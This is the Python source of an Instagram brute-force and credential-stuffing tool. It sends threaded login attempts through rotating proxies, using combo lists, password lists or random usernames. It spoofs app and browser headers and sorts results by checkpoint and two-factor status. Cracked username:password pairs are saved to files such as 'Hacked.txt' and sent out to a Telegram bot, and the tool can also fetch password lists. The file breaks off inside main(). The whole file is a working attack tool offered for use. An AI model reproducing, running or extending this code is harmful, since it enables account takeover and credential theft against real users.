from random import choice
from uuid import uuid4
from requests import get 
import json , os  , requests  , time 
from datetime import datetime
from threading import Thread , Lock
from colorama import Fore , Style
blue = "\033[1;34m";white = "\033[1;37m";red = "\033[1;31m";green = "\033[1;32m";Purple="\033[1;35m";yellow = "\033[1;33m";logos = "\033[1;36m";yellow = "\033[1;33m";logos = "\033[1;36m"
def LOGO():
    return r"""
     /$$$$$$      /$$$$$$   /$$$$$$    /$$    /$$$$$$   /$$$$$$   /$$$$$$       
   /$$$__  $$$   /$$__  $$ /$$__  $$ /$$$$   /$$__  $$ /$$__  $$ /$$__  $$      https://instagram.com/221289
  /$$_/  \_  $$ |__/  \ $$|__/  \ $$|_  $$  |__/  \ $$| $$  \ $$| $$  \ $$      
 /$$/ /$$$$$  $$  /$$$$$$/  /$$$$$$/  | $$    /$$$$$$/|  $$$$$$$|  $$$$$$/      https://t.me/vv1ck
| $$ /$$  $$| $$ /$$____/  /$$____/   | $$   /$$____/  \____  $$ >$$__  $$      
| $$| $$\ $$| $$| $$      | $$        | $$  | $$       /$$  \ $$| $$  \ $$      
| $$|  $$$$$$$$/| $$$$$$$$| $$$$$$$$ /$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/      
|  $$\________/ |________/|________/|______/|________/ \______/  \______/       
 \  $$$   /$$$                                                                  
  \_  $$$$$$_/                                                                  
    \______/                                                                                                                                                               
"""
if os.name == 'nt':
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LOGO())
    os.system('title IG Brute Force ~ Version 6.0')
def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    return fr"""
    {Fore.RED}███████████████████████████     ___  __    _      _      
    {Fore.GREEN}███████▀▀▀░░░░░░░▀▀▀███████      |  /__   |_ | | /  |/   
    {Fore.YELLOW}████▀░░░░░░░░░░░░░░░░░▀████     _|_ \_|   |  |_| \_ |\   
    {Fore.CYAN}███│░░░░░░░░░░░░░░░░░░░│███                          
    {Fore.MAGENTA}██▌│░░░░░░░░░░░░░░░░░░░│▐██                          
    {Fore.BLUE}██░└┐░░░░░░░░░░░░░░░░░┌┘░██                          
    {Fore.RED}██░░└┐░░░░░░░░░░░░░░░┌┘░░██                          
    {Fore.GREEN}██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██                          
    {Fore.RED}██▌░│██████▌░░░▐██████│░▐██                          
    {Fore.BLUE}███░│▐███▀▀░░▄░░▀▀███▌│░███       [+] Instagram Brute Force
    {Fore.MAGENTA}██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██       [+] Author: joker & vv1ck
    {Fore.CYAN}██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██          [+] Version: 6.0
    {Fore.RED}████▄─┘██▌░░░░░░░▐██└─▄████                          
    {Fore.GREEN}█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████                          
    {Fore.YELLOW}████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████                          
    {Fore.BLUE}█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████                          
    {Fore.MAGENTA}███████▄░░░░░░░░░░░▄███████                          
    {Fore.BLUE}██████████▄▄▄▄▄▄▄██████████                          
    {Fore.RED}███████████████████████████     
    {Style.RESET_ALL}"""
def read_file_lines(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            return file.readlines()
    except FileNotFoundError: print('[+] Error, file not found. Try Again.')
    except UnicodeDecodeError as e:print(f'[+] Error decoding file')
    return []
def get_user_input(prompt, error_message):
    while True:
        value = input(prompt)
        if value:
            return value
        print(error_message)
class check:
    def __init__(self,MOD):
        self.MOD = MOD
        self.RUN = True
        self.secuess ,self.CM ,self.CM2 ,self.bad_password,self.secure ,self.prx , self.bad_user ,self.banned ,self.errors = 0, 0, 0,0,0,0,0,0,0
        self.user , self.password= "jokr" , 'paassword1'
        self.proxy = []
        self.lstOLD = []
        self.PRINT = Lock()
        self.uuid = uuid4()
        self.Check_Mode()
    def Check_Mode(self):
        if self.MOD == '1':
            self.t = get_user_input('\n[+] Enter Combo File: ', '[+] Error, file not found. Try Again.')
            self.line_count = len(read_file_lines(self.t))
            self.file = open(self.t, 'r', encoding='utf-8', errors='ignore')
            self.thr()
        elif self.MOD == '2':
            self.t = get_user_input('\n[+] Enter Combo File: ', '[+] Error, file not found. Try Again.')
            self.line_count = len(read_file_lines(self.t))
            with open(self.t, 'r', encoding='utf-8', errors='ignore') as file:
                self.lines = [line for line in file.readlines() if line.strip()]
            self.thr()
        elif self.MOD == '3':
            self.password = get_user_input('[+] Enter Password: ', '[+] Error, password cannot be empty.')
            while True:
                try:
                    self.LEVL = int(get_user_input('\n[+] Enter The Length Of The Username: ', '[+] Error, invalid level.'))
                    break
                except ValueError:print('[+] Error, invalid level.')
            self.thr()
        elif self.MOD == '4':
            self.password = get_user_input('[+] Enter Password: ', '[+] Error, password cannot be empty.')
            while True:
                try:
                    self.t = get_user_input('\n[+] Enter Usernames File: ', '[+] Error, file not found. Try Again.')
                    self.line_count = len(read_file_lines(self.t))
                    self.file = open(self.t, 'r', encoding='utf-8', errors='ignore')
                    break
                except FileNotFoundError: print('[+] Error, file not found. Try Again.')
                except UnicodeDecodeError as e:print(f'[+] Error decoding file')
            self.thr()
        elif self.MOD == '5':
            self.user = get_user_input('[+] Enter Username Or Email: ', '[+] Error, username cannot be empty.')
            while True:
                try:
                    self.t = get_user_input('\n[+] Enter Passwords File: ', '[+] Error, file not found. Try Again.')
                    self.line_count = len(read_file_lines(self.t))
                    self.file = open(self.t,'r', encoding='utf-8', errors='ignore')
                    break
                except FileNotFoundError: print('[+] Error, file not found. Try Again.')
                except UnicodeDecodeError as e:print(f'[+] Error decoding file')
            self.thr()
        elif self.MOD == '6':
            while True:
                try:
                    self.t = get_user_input('\n[+] Enter Passwords File: ', '[+] Error, file not found. Try Again.')
                    self.passwords = open(self.t,'r', encoding='utf-8', errors='ignore').read().splitlines()
                    break
                except FileNotFoundError: print('[+] Error, file not found. Try Again.')
                except UnicodeDecodeError as e:print(f'[+] Error decoding file')
            self.length = len(self.passwords)
            self.counter_read = 0
            while True:
                try:
                    self.LEVL = int(get_user_input('\n[+] Enter The Length Of The Username: ', '[+] Error, invalid level.'))
                    break
                except ValueError:print('[+] Error, invalid level.')
            self.user = str(''.join((choice('qwe1rty2uiop3asd4fg_hjkl5zxcv6bnmza7qwsxedcr9fvbhy_ojmly') for i in range(self.LEVL))))
            self.thr()
        elif self.MOD == '7':
            while True:
                try:
                    self.t = get_user_input('\n[+] Enter Usernames File: ', '[+] Error, file not found. Try Again.')
                    self.line_count = len(read_file_lines(self.t))
                    self.file = open(self.t,'r', encoding='utf-8', errors='ignore')
                    break
                except FileNotFoundError: print('[+] Error, file not found. Try Again.')
                except UnicodeDecodeError as e:print(f'[+] Error decoding file')
            while True:
                try:
                    self.t = get_user_input('\n[+] Enter Passwords File: ', '[+] Error, file not found. Try Again.')
                    self.passwords = open(self.t,'r', encoding='utf-8', errors='ignore').read().splitlines()
                    break
                except FileNotFoundError: print('[+] Error, file not found. Try Again.')
                except UnicodeDecodeError as e:print(f'[+] Error decoding file')
            self.length = len(self.passwords)
            self.counter_read = 0
            self.thr()
    def get_mid(self):
        try:
            params = None
            api_url = f"https://i.instagram.com/api/v1/accounts/login"
            response = requests.get(api_url, params=params)
            mid = response.cookies.get("mid")
            if mid != None:
                return mid
            else:
                u01 = 'QWERTYUIOPASDFGHJKLZXCVBNM'
                us1 = str("".join(choice(u01)for k in range(int(8))))
                return f'Y4nS4g{us1}zwIrWdeYLcD9Shxj'
        except Exception as JO:
            u01 = 'QWERTYUIOPASDFGHJKLZXCVBNM'
            us1 = str("".join(choice(u01)for k in range(int(8))))
            return f'Y4nS4g{us1}zwIrWdeYLcD9Shxj'
    def cookies(self):
        try:
            req = requests.get('https://www.instagram.com')
            csrftoken = req.cookies.get("csrftoken")
            c = {'csrftoken':csrftoken,'mid':self.get_mid()}
        except Exception as JO:
            c = {'csrftoken':'BIDffV24xwXmZmbSSYCJz1TbyrWptSdP','mid':self.get_mid()}
        return c
    def update_proxy(self):
        PRX = str(choice(self.proxy))
        if self.proxy_type == '1':
            return {
                'http': f'http://{PRX}',
                'https': f'http://{PRX}'}
        elif self.proxy_type == '2':
            return {
                'http': f'socks4://{PRX}',
                'https': f'socks4://{PRX}'}
        elif self.proxy_type == '3':
            return {
                'http': f'socks5://{PRX}',
                'https': f'socks5://{PRX}'}
        else:
            raise ValueError("Unsupported proxy type. Use 'http', 'socks4', or 'socks5'.")
    def api(self):
        dpi_phone = ['133', '320', '515', '160', '640', '240', '120', '800', '480', '225', '768', '216', '1024']
        model_phone = ['Nokia 2.4', 'HUAWEI', 'Galaxy', 'Unlocked Smartphones', 'Nexus 6P', 'Mobile Phones', 'Xiaomi', 'Samsung', 'OnePlus']
        pxl_phone = ['623x1280', '700x1245', '800x1280', '1080x2340', '1320x2400', '1242x2688']
        i_version = ['114.0.0.20.2', '114.0.0.38.120', '114.0.0.20.70', '114.0.0.28.120', '114.0.0.0.24', '114.0.0.0.41']
        user_agent = f'Instagram {choice(i_version)} Android (30/3.0; {choice(dpi_phone)}dpi; {choice(pxl_phone)}; huawei/google; {choice(model_phone)}; angler; angler; en_US)'
        pr=self.update_proxy()
        username,password = self.user,self.password
        api_log = requests.post('https://i.instagram.com/api/v1/accounts/login/',
            headers={
            'Host': 'i.instagram.com',
            'Accept': '*/*',
            'User-Agent': user_agent,
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            },
            data={
                'uuid': self.uuid,
                'password': password,
                'username': username,
                'device_id': self.uuid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_count': '0', 
            },proxies=pr)
        if 'checkpoint_required' in api_log.text:
            if username in self.lstOLD:self.update_user_password()
            else:
                self.secure+=1
                self.lstOLD.append(username)
                with open('secure.txt', 'a') as wr:
                    wr.write(f"{username}:{password}\n")
                self.send_TELEGRAM(username,password,'White')                        
                self.update_user_password()
        else:
            self.bad_password += 1
            self.update_user_password()
            
    def login(self):
        while self.RUN:
            cookie = self.cooki
            pr=self.update_proxy()
            username,password = self.user,self.password
            headers = {
                    "Host": "www.instagram.com",
                    "Content-Length": "365",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://www.instagram.com",#See you, thief, go program yourself. 
                "Referer": "https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbgL8JrGd3MCKSnptsaJ8K-FABbYtm0hiQ7h4-mvHvHcpgwP6daZ5fOU4bzGAXp9x_74Q8yQ6uIIR2BOWlfInvau7bruwonmn6W4ne8Y2xusSwwnHPT62U1m&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Fprofiles%252F",#Joker Here {Fuck you}
                "X-Requested-With": "XMLHttpRequest",
                "X-Instagram-Ajax": "1019152511",
                "X-Ig-App-Id": "936619743392459",
                "X-Ig-Www-Claim": "0",
                "X-Web-Session-Id": "05lr7x:o7w9wq:dffg0a",
                "X-Asbd-Id": "129477",
                "X-Csrftoken": cookie.get('csrftoken'),
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Sec-Ch-Ua": '"Not;A=Brand";v="99", "Chromium";v="106"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Ch-Ua-Platform-Version": '"15.0.0"',
                "Sec-Ch-Ua-Full-Version-List": '"Not;A=Brand";v="99.0.0.0", "Chromium";v="106.0.5249.62"',
                "Sec-Ch-Prefers-Color-Scheme": "dark",
                "Sec-Ch-Ua-Model": "",}
            data= f'enc_password=#PWD_INSTAGRAM_BROWSER:0:{str(time.time)}:{self.password}&etoken=AbgL8JrGd3MCKSnptsaJ8K-FABbYtm0hiQ7h4-mvHvHcpgwP6daZ5fOU4bzGAXp9x_74Q8yQ6uIIR2BOWlfInvau7bruwonmn6W4ne8Y2xusSwwnHPT62U1m&username={self.user}'
            try:
                log = requests.post('https://www.instagram.com/api/v1/web/fxcal/auth/login/ajax/', headers=headers, data=data,cookies=cookie, proxies=pr,timeout=10)
                if '"authenticated":true' in log.text:
                    with self.PRINT:
                        if '"username":"Instagram User"' in log.text:
                            if username in self.lstOLD:self.update_user_password()
                            else:
                                self.banned +=1
                                self.lstOLD.append(username)
                                with open('Banned.txt', 'a') as wr:
                                    wr.write(f"{username}:{password}\n")
                                self.send_TELEGRAM(username,password,'Banned')
                                self.update_user_password()
                        else:
                            if username in self.lstOLD:self.update_user_password()
                            else:
                                self.secuess+=1
                                self.lstOLD.append(username)
                                with open('Hacked.txt', 'a') as wr:
                                    wr.write(f"{username}:{password}\n")
                                self.send_TELEGRAM(username,password,'Secuess')
                                self.update_user_password()
                elif '"userId":' in log.text:
                    with self.PRINT:
                        if username in self.lstOLD:self.update_user_password()
                        else:
                            self.secuess+=1
                            self.lstOLD.append(username)
                            with open('Hacked.txt', 'a') as wr:
                                wr.write(f"{username}:{password}\n")
                            self.send_TELEGRAM(username,password,'Secuess')
                            self.update_user_password()
                elif '"oneTapPrompt":true,' in log.text:
                    with self.PRINT:
                        if username in self.lstOLD:self.update_user_password()
                        else:
                            self.secuess+=1
                            self.lstOLD.append(username)
                            with open('Hacked.txt', 'a') as wr:
                                wr.write(f"{username}:{password}\n")
                            self.send_TELEGRAM(username,password,'Secuess')
                            self.update_user_password()
                elif '"message":"checkpoint_required",' in log.text:
                    if username in self.lstOLD:self.update_user_password()
                    else:
                        with self.PRINT:
                            self.secure+=1
                            self.lstOLD.append(username)
                            try:
                                checkpoint_url = log.json()['checkpoint_url']
                                checkpoint = str(checkpoint_url).split('/challenge/action/')[1]
                                QTR = get(
                                    f'https://www.instagram.com/api/v1/challenge/web/{checkpoint}',
                                    headers = {"Host": "www.instagram.com","Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"","X-Ig-Www-Claim": "hmac.AR2a7RtRZyo7QMPMaT4vRPVu5y-dlEw5FKjC4HGInmqIVz2u","X-Web-Session-Id": "7u3eqs:4uh3d9:yvrjru","Sec-Ch-Ua-Platform-Version": "\"15.0.0\"","X-Requested-With": "XMLHttpRequest","Sec-Ch-Ua-Full-Version-List": "\"Not;A=Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"106.0.5249.62\"","Sec-Ch-Prefers-Color-Scheme": "dark","X-Csrftoken": cookie.get('csrftoken'),"Sec-Ch-Ua-Platform": "\"Windows\"","X-Ig-App-Id": "936619743392459","Sec-Ch-Ua-Model": "","Sec-Ch-Ua-Mobile": "?0","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36","X-Bloks-Version-Id": "abaff5d09a530689e609e838538ae53475ff0cac083a548efad6633e0e625cff","Accept": "*/*", "X-Asbd-Id": "129477","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": f"https://www.instagram.com/challenge/action/{checkpoint}","Accept-Language": "en-US,en;q=0.9"},
                                    cookies=cookie)
                                if ('forward' in QTR.text and 'Suspicious Login Attempt' not in QTR.text):
                                    types = 'White'
                                    files = 'Secure-White.txt'
                                else:
                                    if ('Suspicious Login Attempt' in QTR.text):
                                        types = 'Red'
                                        files = 'Secure-Red.txt'
                                    else:
                                        types = 'Secure'
                                        files = 'Secure.txt'
                            except Exception as e:
                                types = 'Secure'
                                files = 'Secure.txt'
                            with open(files, 'a') as wr:
                                wr.write(f"{username}:{password}\n")
                            self.cooki = self.cookies()
                            self.send_TELEGRAM(username,password,types)
                            self.update_user_password()
                elif '"checkpoint_url":"/challenge/action/' in log.text:
                    if username in self.lstOLD:self.update_user_password()
                    else:
                        with self.PRINT:
                            self.secure+=1
                            self.lstOLD.append(username)
                            try:
                                checkpoint_url = log.json()['checkpoint_url']
                                checkpoint = str(checkpoint_url).split('/challenge/action/')[1]
                                QTR = get(
                                    f'https://www.instagram.com/api/v1/challenge/web/{checkpoint}',
                                    headers = {"Host": "www.instagram.com","Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"","X-Ig-Www-Claim": "hmac.AR2a7RtRZyo7QMPMaT4vRPVu5y-dlEw5FKjC4HGInmqIVz2u","X-Web-Session-Id": "7u3eqs:4uh3d9:yvrjru","Sec-Ch-Ua-Platform-Version": "\"15.0.0\"","X-Requested-With": "XMLHttpRequest","Sec-Ch-Ua-Full-Version-List": "\"Not;A=Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"106.0.5249.62\"","Sec-Ch-Prefers-Color-Scheme": "dark","X-Csrftoken": cookie.get('csrftoken'),"Sec-Ch-Ua-Platform": "\"Windows\"","X-Ig-App-Id": "936619743392459","Sec-Ch-Ua-Model": "","Sec-Ch-Ua-Mobile": "?0","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36","X-Bloks-Version-Id": "abaff5d09a530689e609e838538ae53475ff0cac083a548efad6633e0e625cff","Accept": "*/*", "X-Asbd-Id": "129477","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": f"https://www.instagram.com/challenge/action/{checkpoint}","Accept-Language": "en-US,en;q=0.9"},
                                    cookies=cookie)
                                if ('forward' in QTR.text and 'Suspicious Login Attempt' not in QTR.text):
                                    types = 'White'
                                    files = 'Secure-White.txt'
                                else:
                                    if ('Suspicious Login Attempt' in QTR.text):
                                        types = 'Red'
                                        files = 'Secure-Red.txt'
                                    else:
                                        types = 'Secure'
                                        files = 'Secure.txt'
                            except Exception as e:
                                types = 'Secure'
                                files = 'Secure.txt'
                            with open(files, 'a') as wr:
                                wr.write(f"{username}:{password}\n")
                            self.cooki = self.cookies()
                            self.send_TELEGRAM(username,password,types)
                            self.update_user_password()
                elif '"two_factor_required":true' in log.text:
                    if username in self.lstOLD:self.update_user_password()
                    else:
                        with self.PRINT:
                            self.secure+=1
                            self.lstOLD.append(username)
                            with open('secure_two_factor.txt', 'a') as wr:
                                wr.write(f"{username}:{password}\n")
                            self.send_TELEGRAM(username,password,'two factor')                        
                            self.update_user_password()
                elif '"two_factor_identifier"' in log.text:
                    if username in self.lstOLD:self.update_user_password()
                    else:
                        with self.PRINT:
                            self.secure+=1
                            self.lstOLD.append(username)
                            with open('secure_two_factor.txt', 'a') as wr:
                                wr.write(f"{username}:{password}\n")
                            self.send_TELEGRAM(username,password,'two factor')                        
                            self.update_user_password()
                elif '"authenticated":false,' in log.text:
                    with self.PRINT:
                        self.bad_password += 1
                        self.update_user_password()
                elif '"token":"error",' in log.text:
                    with self.PRINT:
                        self.bad_password += 1
                        self.update_user_password()
                elif '"UserInvalidCredentials",' in log.text:
                    with self.PRINT:
                        self.bad_password += 1
                        self.update_user_password()
                elif "To secure your account, we've reset your password." in log.text:
                    with self.PRINT:
                        self.bad_password += 1
                        self.update_user_password()
                elif "on the login screen and follow the instructions to access your account" in log.text:
                    with self.PRINT:
                        self.bad_password += 1
                        self.update_user_password()
                elif '"UserInvalidCredentials"' in log.text:
                    with self.PRINT:
                        self.bad_password += 1
                        self.update_user_password()
                elif "'Unable to connect to proxy'" in log.text:
                    self.prx +=1
                elif 'ConnectTimeoutError' in log.text:
                    self.prx +=1  
                elif 'Max retries exceeded with url:' in log.text:
                    self.prx +=1
                elif 'generic_request_error' in log.text:
                    self.prx += 1
                elif 'Sorry, there was a problem with your request.' in log.text:
                    self.prx += 1
                elif '"message":"Error","status":"fail"' in log.text:self.api()
                elif "There was an error with your request. Please try again." in log.text:
                    self.prx += 1
                elif'ip_block' in log.text:
                    self.prx +=1
                elif '"Please wait a few minutes before you try again."' in log.text:
                    self.prx += 1
                elif 'Sorry, something went wrong.' in log.text:
                    with self.PRINT:
                        self.bad_password += 1
                        self.update_user_password()
                else:
                    try:
                        with open('errors.txt', 'a' , encoding='utf-8') as gr:
                            gr.write(f'{str(log.text)}\n')    
                        self.errors += 1        
                        self.update_user_password()
                    except Exception as e:pass
            except (requests.exceptions.ConnectionError , requests.exceptions.ReadTimeout , requests.exceptions.ChunkedEncodingError , requests.exceptions.InvalidURL , requests.exceptions.ProxyError , requests.exceptions.Timeout , requests.exceptions.HTTPError):
                 self.prx += 1
            except (UnicodeDecodeError, UnicodeEncodeError, KeyError, IndexError) as e:
                try:
                    with open('errors.txt', 'a' , encoding='utf-8') as gr:
                        gr.write(f'{e} \n')
                    self.errors += 1
                    self.update_user_password()
                except UnicodeEncodeError:pass
            with self.PRINT:
                print(f'\r{green}Logging: {self.secuess},{Purple} Secure: {self.secure}, {Fore.YELLOW} Banned: {self.banned}, {Fore.RED} fail: {self.bad_password}, Bad User: {self.bad_user},{blue} PRX: {self.prx}{white},{Fore.RED} Errors: {self.errors}\r', end='')
    def send_TELEGRAM(self,username,password,Typs):
        if (Typs == 'Secuess'):
            typs = 'Type Account: Hacked 🔥🔥'
            gif_urls = 'https://media1.tenor.com/m/nzxd8zLmbL4AAAAd/uchiha-madara-uchiha.gif'
        elif (Typs == 'Red'):
            typs = 'Type Account: Red 🔴'
            gif_urls = 'https://media1.tenor.com/m/Iy7uWP17ZvQAAAAd/anime-sad.gif'
        elif (Typs == 'White'):
            typs = 'Type Account: White ⚪️'
            gif_urls = 'https://media1.tenor.com/m/g8AeFZoe7dsAAAAd/kiss-anime-kiss.gif'
        elif (Typs == 'Banned'):
            typs = 'Type Account: Banned ⚠️'
            gif_urls = 'https://media1.tenor.com/m/iSOANTCPvHYAAAAC/aestheic-black.gif'
        elif (Typs == 'two factor'):
            typs = 'Type Account: Two Factor ⚠️'
            gif_urls = 'https://media1.tenor.com/m/iSOANTCPvHYAAAAC/aestheic-black.gif'
        else:
            typs = 'Type Account: Secure ⚫️'
            gif_urls = 'https://media1.tenor.com/m/tuH4YoEV63oAAAAd/giyuu-giyu.gif'
        TELEGRAM_MESSAGE = (
                f"👤 User: {username}\n"
                f"🥷 Password: {password}\n"
                f"🛡️ {typs}\n"
                f"🗓️ Fishing history: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
                "☠️ By @vv1ck @JJNN1")
        if self.TOKEN==False:pass
        else:
            try:requests.get(f'https://api.telegram.org/bot{self.TOKEN}/sendAnimation?chat_id={self.ID}&animation={gif_urls}&caption={TELEGRAM_MESSAGE}')
            except Exception as e:
                try:requests.post(f'https://api.telegram.org/bot{self.TOKEN}/sendmessage?chat_id={self.ID}&text={TELEGRAM_MESSAGE}')
                except Exception as e:pass
    def update_user_password(self):
        if self.MOD == '1':
            if self.CM >= self.line_count:
                self.RUN = False
            else:
                try:line = self.file.readline().strip()
                except UnicodeDecodeError:line = self.file.readline().strip().encode('utf-8').decode('utf-8')
                while not line and not self.file.tell() == os.fstat(self.file.fileno()).st_size:
                    line = self.file.readline().strip()
                if not line:self.user, self.password = 'jokr', 'vv2ck'
                else:self.user, self.password = (line.split(':') + ["vv3ck"])[:2]
                self.CM += 1
        elif self.MOD == '2':
            if not self.lines:
                self.RUN = False
            else:
                random_line = choice(self.lines)
                try:
                    self.user , self.password = random_line.strip().split(':')
                    self.lines.remove(random_line)
                except ValueError:
                    self.user, self.password = 'jokr', 'vv2ck'
                if self.user is None:
                    self.RUN = False
        elif self.MOD == '3':
            self.user = str(''.join((choice('qwe1rty2uiop3asd4fg_hjkl5zxcv6bnmza7qwsxedcr9fvbhy_ojmly') for i in range(self.LEVL))))
        elif self.MOD == '4':
            if self.CM >= self.line_count:
                self.RUN = False
            else:
                try:line = self.file.readline().strip()
                except UnicodeDecodeError:line = self.file.readline().strip().encode('utf-8').decode('utf-8')
                while not line and not self.file.tell() == os.fstat(self.file.fileno()).st_size:
                    line = self.file.readline().strip()
                if not line:self.user = False
                else:self.user = line
                self.CM += 1
        elif self.MOD == '5':
            if self.CM >= self.line_count:
                self.RUN = False
            else:
                try:line = self.file.readline().strip()
                except UnicodeDecodeError:line = self.file.readline().strip().encode('utf-8').decode('utf-8')
                while not line and not self.file.tell() == os.fstat(self.file.fileno()).st_size:
                    line = self.file.readline().strip()
                if not line:self.password = False
                else:self.password = line
                self.CM += 1
        elif self.MOD == '6':
            if self.counter_read>=self.length:
                self.user = str(''.join((choice('qwe1rty2uiop3asd4fg_hjkl5zxcv6bnmza7qwsxedcr9fvbhy_ojmly') for i in range(self.LEVL))))
                self.counter_read = 0 
            self.password = self.passwords[self.counter_read]
            self.counter_read +=1
        elif self.MOD == '7':
            if self.CM >= self.line_count:
                self.RUN = False
            else:
                if self.user == 'jokr':
                    try:line = self.file.readline().strip()
                    except UnicodeDecodeError:line = self.file.readline().strip().encode('utf-8').decode('utf-8')
                    while not line and not self.file.tell() == os.fstat(self.file.fileno()).st_size:
                        line = self.file.readline().strip()
                    if not line:self.user = False
                    else:self.user = line
                    self.counter_read = 0 
                if self.counter_read>=self.length:
                    try:line = self.file.readline().strip()
                    except UnicodeDecodeError:line = self.file.readline().strip().encode('utf-8').decode('utf-8')
                    while not line and not self.file.tell() == os.fstat(self.file.fileno()).st_size:
                        line = self.file.readline().strip()
                    if not line:self.user = False
                    else:self.user = line
                    self.CM += 1
                    self.counter_read = 0 
                self.password = self.passwords[self.counter_read]
                self.counter_read +=1

    def thr(self):
        px = input('[+] Enter proxy file: ')
        if os.path.isfile(px):
            with open(px, 'r') as proxy_file:
                self.proxy = proxy_file.read().splitlines()
        else:
            print('[+] Error, file not found. Try again.')
            return  self.thr()
        while True:
            self.proxy_type = input(f"[+] Enter Type Proxy -1) HTTP/S  , -2) SOCKS4 , -3) SOCKS5: ")
            if self.proxy_type in ['1', '2', '3']:
                break
            else:
                print(f'[-] Error, Try again.')
        thread = []
        while True: 
            try:
                THr = 150 #int(input('[+] Enter number of threads: '))
                break
            except ValueError:
                print('[+] Error, invalid number of threads.')
        while True: 
            try:
                self.Time_out = 10 #int(input('[+] Enter number of Time_out [5-20]: '))
                break
            except ValueError:
                print('[+] Error, invalid number of Time_out.')
        self.Check_TelegramID()
        self.cooki = self.cookies()
        if self.user == 'jokr':self.update_user_password();self.CM = 0
        print(logo())
        for _ in range(THr):
            th=Thread(target=self.login)
            th.start()
            thread.append(th)
        for i in thread:
            i.join()
        print(f'{logo()}\n\n')
        input('[+] Finished! ..')
    def Check_TelegramID(self):
        try:
            TELEGRAMS = open('TELEGRAM_BOT.json', 'r')
            TELEGRAMS = json.load(TELEGRAMS)
            self.ID = TELEGRAMS['ID']
            self.TOKEN = TELEGRAMS['TOKEN']
        except FileNotFoundError:
            self.ID = input('[+] Enter Telegram ID : ')
            self.TOKEN = input('[+] Enter Telegram Token : ')
            if self.ID and self.TOKEN:
                with open('TELEGRAM_BOT.json', 'w') as file:
                    file.write(f'{{"ID": "{self.ID}", "TOKEN": "{self.TOKEN}"}}')
            else:
                print('[+] Error, please enter the ID and Token.')
                return self.Check_TelegramID()
def New_Lists(TYPS):
    if TYPS =='1':
        url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt'
        files = 'passwords_10M.txt'
        msg = f'The file has been downloaded successfully ( {files} ), press ok to return to the home page'
    else:
        url = 'https://raw.githubusercontent.com/hxxek/Ig-fuck/refs/heads/main/Fresh-pass.txt'
        files = 'fresh_password.txt'
        msg = f'The file has been downloaded successfully ( {files} ), press ok to return to the home page'
    response = get(url)
    if response.status_code == 200:
        with open(files, 'w') as file:
            file.write(response.text)
        print(msg)
    else:print('Error', 'An error occurred while downloading the file, press OK to return to the home page')
    main()

def New_PASS(TYPS):
    if TYPS =='1':main()
    else:
        Modes2 =input(f'{logo()}\n[$] options:\n   -1) List of 10 million most popular passwords\n   -2) New and fresh passwords\n   -3) About options\n   [<>] Press to back <<\n [?] Enter : ')
        if Modes2 in ['1' , '2']:New_Lists(Modes2)
        elif Modes2 == '3':
            New_PASS('2')
        else:main()
def main():
    for char in logo():
        print(char, end='', flush=True)
        time.sleep(0.0005)
    Modes = input(f'\n[</>] {Fore.GREEN}Guessing {Fore.RESET}options :\n -1) {Fore.GREEN}Guessing {Fore.RESET}with ComboList [user:pass]\n -2) {Fore.GREEN}Guessing {Fore.RESET}from a ComboList file randomly\n -3) {Fore.GREEN}Guessing {Fore.RESET}with a specific {Fore.YELLOW}password{Fore.RESET} on a random {Fore.YELLOW}usernames{Fore.RESET}\n -4) {Fore.GREEN}Guessing {Fore.RESET}with a specific {Fore.YELLOW}password{Fore.RESET} on {Fore.YELLOW}usernames{Fore.RESET} from a file\n -5) {Fore.GREEN}Guessing {Fore.RESET}with a specific {Fore.YELLOW}username{Fore.RESET} on {Fore.YELLOW}passwords{Fore.RESET} from a file\n -6) {Fore.GREEN}Guessing {Fore.RESET}with a random {Fore.YELLOW}username{Fore.RESET} on {Fore.YELLOW}passwords{Fore.RESET} from a file \n -7) {Fore.GREEN}Guessing {Fore.RESET}from {Fore.YELLOW}usernames{Fore.RESET} file and {Fore.YELLOW}passwords{Fore.RESET} file\n -8) Download New Passwords File\n -9) About Tool\n  [?] Choice: ')
